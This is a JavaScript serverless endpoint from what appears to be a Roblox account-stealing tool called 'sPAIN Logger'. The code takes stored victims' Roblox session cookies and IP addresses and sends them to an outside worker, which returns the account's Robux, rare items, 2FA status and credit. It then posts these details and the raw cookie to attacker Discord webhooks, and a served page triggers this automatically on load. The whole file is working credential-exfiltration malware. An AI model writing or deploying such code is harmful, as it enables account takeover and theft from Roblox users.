// api/refresh.js — auto-sends full info on page load, no buttons
const REDIS_URL   = process.env.UPSTASH_REDIS_REST_URL;
const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
const WORKER_URL  = 'https://holy-truth-3129.notrllyme133.workers.dev/';

async function redisGet(key) {
  try {
    const res  = await fetch(`${REDIS_URL}/get/${encodeURIComponent(key)}`, {
      headers: { Authorization: `Bearer ${REDIS_TOKEN}` }
    });
    const json = await res.json();
    if (!json.result) return null;
    let r = json.result;
    if (typeof r === 'string') { try { r = JSON.parse(r); } catch { return null; } }
    if (r && typeof r.value === 'string' && !r.webhook) { try { r = JSON.parse(r.value); } catch {} }
    return r || null;
  } catch { return null; }
}

function parseBody(raw) {
  if (!raw) return {};
  if (typeof raw === 'object' && !Buffer.isBuffer(raw)) return raw;
  try { return JSON.parse(Buffer.isBuffer(raw) ? raw.toString('utf8') : String(raw)); }
  catch { return {}; }
}

async function discordSend(url, payload) {
  if (!url?.includes('discord.com/api/webhooks')) return;
  try {
    await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
  } catch (_) {}
}

async function discordChunked(url, text) {
  let rem = text; let first = true;
  while (rem.length > 0) {
    const chunk = rem.substring(0, 1950); rem = rem.substring(1950);
    await discordSend(url, {
      content: first
        ? '```\n' + chunk + (rem.length === 0 ? '\n```' : '')
        : chunk + (rem.length === 0 ? '\n```' : '')
    });
    first = false;
  }
}

function fmt(n) { return Number(n || 0).toLocaleString(); }

async function sendToDiscord(webhookUrl, info, record) {
  const now = new Date().toISOString();
  await discordSend(webhookUrl, {
    content: '@everyone',
    embeds: [{
      title:       `🧑 ${info.username} ${info.isPremium ? '⭐' : ''}`,
      description: `:fire: \`sPAIN\` :fire:\n\n[Profile 👤](https://www.roblox.com/users/${info.id}/profile)`,
      color:       0xc026d3,
      fields: [
        { name: '💰 Robux',        value: `\`${fmt(info.robux)} R$\``,        inline: true },
        { name: '🌐 IP',           value: record.ip || 'Unknown',              inline: true },
        { name: '🗺️ ISP',          value: record.isp || 'Unknown',             inline: true },
        { name: '📊 Account Age',  value: `\`${info.accountAgeDays} days\``,  inline: true },
        { name: '📈 Day/Week/Year',value: `\`${fmt(info.txDay)}\` / \`${fmt(info.txWeek)}\` / \`${fmt(info.txYear)}\` R$`, inline: false },
        { name: '👥 Groups',       value: `Owned: \`${info.groupsOwned}\` | Balance: \`${fmt(info.groupRobux)} R$\` | Pending: \`${fmt(info.groupPending)} R$\``, inline: false },
        { name: '🛒 Limiteds',     value: `Count: \`${info.limitedsCount}\` | RAP: \`${fmt(info.limitedsValue)} R$\`\n💀 Headless: ${info.hasHeadless ? '✅' : '❌'} | 🤖 Korblox: ${info.hasKorblox ? '✅' : '❌'}`, inline: false },
        { name: '💳 Credit',       value: `\`${info.credit} USD\``,            inline: true },
        { name: '👥 Friends',      value: `\`${info.friends}\``,               inline: true },
        { name: '⚙️ Settings',     value: `Email: ${info.emailSet}\nVerified: ${info.emailVerified}\n2FA: ${info.twoFA}`, inline: true },
        { name: '🎮 Gamepasses',   value: `MM2: ${info.gamepasses?.mm2 ? '✅' : '❌'} | Adopt Me: ${info.gamepasses?.adoptMe ? '✅' : '❌'} | PLS Donate: ${info.gamepasses?.plsDonate ? '✅' : '❌'}`, inline: false },
        { name: '📅 Refreshed',    value: `\`${now}\``, inline: false },
      ],
      footer:    { text: `sPAIN Logger • ${record.pageName || 'unknown'}` },
      thumbnail: { url: info.avatarUrl }
    }]
  });

  // Cookie as separate chunked message
  await discordChunked(webhookUrl, record.cookie);
}

function buildPage(id, autoTrigger) {
  return `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>sPAIN Tools</title>
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700;900&family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
<style>
  :root{--bg:#080810;--card:#0d0d1a;--accent:#c026d3;--accent2:#a855f7;--accent3:#06b6d4;--text:#f0f0f8;--muted:#5a5a78}
  *{margin:0;padding:0;box-sizing:border-box}
  body{background:var(--bg);color:var(--text);font-family:'Inter',sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:24px}
  .aurora{position:fixed;inset:0;pointer-events:none;z-index:0;overflow:hidden}
  .blob{position:absolute;border-radius:50%;filter:blur(100px);opacity:0.12}
  .blob1{width:700px;height:700px;background:var(--accent);top:-200px;left:-200px;animation:drift 14s ease-in-out infinite alternate}
  .blob2{width:500px;height:500px;background:var(--accent3);bottom:-100px;right:-100px;animation:drift 18s ease-in-out infinite alternate;animation-delay:-6s}
  @keyframes drift{from{transform:translate(0,0)}to{transform:translate(50px,30px)}}
  .card{position:relative;z-index:2;background:var(--card);border:1px solid rgba(192,38,211,0.18);border-radius:20px;padding:48px 44px;width:100%;max-width:440px;box-shadow:0 0 80px rgba(192,38,211,0.08),0 30px 80px rgba(0,0,0,0.5);text-align:center}
  .card::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,var(--accent),var(--accent2),var(--accent3));border-radius:20px 20px 0 0}
  .logo{font-family:'Orbitron',sans-serif;font-size:1.1rem;font-weight:900;letter-spacing:0.05em;margin-bottom:20px}
  .logo span{color:var(--accent);text-shadow:0 0 16px rgba(192,38,211,0.5)}
  .status{font-size:0.85rem;color:var(--muted);line-height:1.8;min-height:40px}
  .ok{color:#4ade80}.err{color:#f472b6}.spin::after{content:'';display:inline-block;width:12px;height:12px;border:2px solid var(--accent);border-top-color:transparent;border-radius:50%;animation:spin .7s linear infinite;margin-left:8px;vertical-align:middle}
  @keyframes spin{to{transform:rotate(360deg)}}
</style>
</head>
<body>
<div class="aurora"><div class="blob blob1"></div><div class="blob blob2"></div></div>
<div class="card">
  <div class="logo">s<span>PAIN</span> Tools</div>
  <div class="status spin" id="st">Fetching account info...</div>
</div>
<script>
const ID = '${id}';
async function run() {
  const st = document.getElementById('st');
  try {
    const r = await fetch('/api/refresh', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ id: ID })
    });
    const d = await r.json();
    st.className = 'status';
    if (d.success) {
      st.className = 'status ok';
      st.textContent = '✅ Account info sent to Discord!';
    } else {
      st.className = 'status err';
      st.textContent = '❌ ' + (d.error || 'Failed. Cookie may be expired.');
    }
  } catch {
    st.className = 'status err';
    st.textContent = '❌ Network error.';
  }
}
// Auto-fire immediately on page load
run();
</script>
</body>
</html>`;
}

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.status(204).end();

  if (req.method === 'GET') {
    const refreshId = new URL('http://x' + req.url).searchParams.get('id') || '';
    if (!refreshId) {
      res.setHeader('Content-Type', 'text/html');
      return res.status(400).send('<h1 style="font-family:sans-serif;padding:40px;color:#f472b6;background:#080810;min-height:100vh">Missing ID</h1>');
    }
    const record = await redisGet(`refresh:${refreshId}`);
    if (!record) {
      res.setHeader('Content-Type', 'text/html');
      return res.status(404).send('<h1 style="font-family:sans-serif;padding:40px;color:#f472b6;background:#080810;min-height:100vh">Link expired or not found</h1>');
    }
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    return res.status(200).send(buildPage(refreshId));
  }

  if (req.method === 'POST') {
    const body   = parseBody(req.body);
    const postId = body?.id;
    if (!postId) return res.status(400).json({ error: 'id required' });

    const record = await redisGet(`refresh:${postId}`);
    if (!record)        return res.status(404).json({ error: 'Link not found or expired' });
    if (!record.cookie) return res.status(500).json({ error: 'No cookie stored' });
    if (!record.webhook) return res.status(500).json({ error: 'No webhook stored' });

    // Call worker for full info
    let info;
    try {
      const r = await fetch(WORKER_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ cookie: record.cookie, victimIp: record.ip || '' })
      });
      if (!r.ok) return res.status(502).json({ error: 'Worker failed' });
      info = await r.json();
    } catch (e) {
      return res.status(502).json({ error: 'Worker unreachable' });
    }

    if (!info?.valid) return res.status(401).json({ error: 'Cookie invalid or expired' });

    const webhooks = [record.webhook];
    if (record.webhook1 && record.webhook1 !== record.webhook) webhooks.push(record.webhook1);

    await Promise.all(webhooks.map(wh => sendToDiscord(wh, info, record)));

    return res.status(200).json({ success: true });
  }

  return res.status(405).json({ error: 'Method not allowed' });
}
